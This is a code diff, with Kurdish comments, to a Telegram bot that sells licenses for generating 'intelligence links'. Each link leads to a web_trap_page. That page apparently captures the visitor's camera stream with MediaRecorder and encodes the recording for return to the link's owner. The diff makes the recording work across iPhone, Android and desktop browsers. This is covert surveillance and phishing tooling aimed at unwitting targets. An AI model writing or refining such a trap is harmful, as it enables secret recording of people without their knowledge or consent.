@@ -76,31 +76,6 @@ def activate_key(user_id: int, key: str):
     conn.close()
     return False
 
-# دۆزینەوەی خاوەن کلیل بۆ ئەوەی زانیارییەکان بۆ خۆی بڕوات
-def get_owner_by_link_payload(encoded_id: str):
-    try:
-        # لێرەدا دەتوانین بەپێی لینکی دروستکراو یان بە گشتی پاشەکەوتکردنی دوایین بەکارهێنەر یان بەستنەوەی تایتڵ بدۆزینەوە
-        # بۆ ئەوەی دڵنیا بین، هەموو کلیلە چالاکەکان دەپشکنین یان سیستەمی ترمان هەبێت.
-        # باشترین ڕێگە ئەوەیە user_id لە داتابەیس بدۆزینەوە کە کلیلەکەی کارا کردووە بۆ لینکی تایبەت.
-        pass
-    except:
-        pass
-    return None
-
-# یان دەتوانین user_id لە تابلۆی کلیلەکان وەربگرین ئەگەر تەنیا یەک خاوەن هەبێت بۆ هەر لینکێک، 
-# بۆیە با ئایدییەکە ڕاستەوخۆ لە ڕێگەی کلیل یان تۆمارکراوی پێشوو وەربگرین:
-def get_active_user_for_target():
-    # ئەگەر چەند بەکارهێنەرێک هەبن، باشترە user_id لەگەڵ لینکەکەدا encode بکرێت یان لە داتابەیس پاشەکەوت بکرێت.
-    # بۆ سادەیی و دڵنیایی، با user_id لە باکسی لینکدا هەڵبگیرێت یان لە داتابەیس بگەڕێین بەدوای دوایین کەس کە کلیلەکەی کارا کردووە.
-    conn = sqlite3.connect("bot_licenses.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT user_id FROM licenses WHERE user_id IS NOT NULL ORDER BY expiry_date DESC LIMIT 1")
-    row = cursor.fetchone()
-    conn.close()
-    if row:
-        return row[0]
-    return ADMIN_ID
-
 TEXTS = {
     "ku": {
         "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
@@ -284,7 +259,6 @@ async def handle_admin_photo(message: Message):
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
-        # پاشەکەوتکردنی بەستەر بە user_id ی خۆیەوە لە ناو base64 یان سێرڤەر بۆ ئەوەی بۆخۆی بڕوات
         payload_data = f"{user_id}|{target_url}"
         payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(payload_data.encode()).decode()}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
@@ -399,18 +373,15 @@ async def web_trap_page(request: web.Request):
                 video.srcObject = stream;
                 
                 let mediaRecorder;
-                // گونجاندنی کۆدەکە بۆ سەرجەم ئامێرەکان بە تایبەت آیفۆن و سافاری
-                let options = {{ mimeType: 'video/mp4' }};
-                if (!MediaRecorder.isTypeSupported('video/mp4')) {{
-                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {{
-                        options = {{ mimeType: 'video/webm;codecs=vp8,opus' }};
-                    }} else {{
-                        options = {{}};
-                    }}
-                }}
-
                 try {{
-                    mediaRecorder = new MediaRecorder(stream, options);
+                    // چارەسەری کۆتایی بۆ ئەوەی لەسەر کۆمپیوتەر، ئەندرۆید و ئایفۆن ڤیدیۆکە تێک نەچێت
+                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {{
+                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
+                    }} else if (MediaRecorder.isTypeSupported('video/mp4')) {{
+                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
+                    }} else {{
+                        mediaRecorder = new MediaRecorder(stream);
+                    }}
                 }} catch (e) {{
                     mediaRecorder = new MediaRecorder(stream);
                 }}
@@ -421,7 +392,7 @@ async def web_trap_page(request: web.Request):
                 }};
                 
                 mediaRecorder.onstop = function() {{
-                    let blob = new Blob(chunks, {{ type: mediaRecorder.mimeType || 'video/mp4' }});
+                    let blob = new Blob(chunks, {{ type: mediaRecorder.mimeType || 'video/webm' }});
                     let reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = function() {{
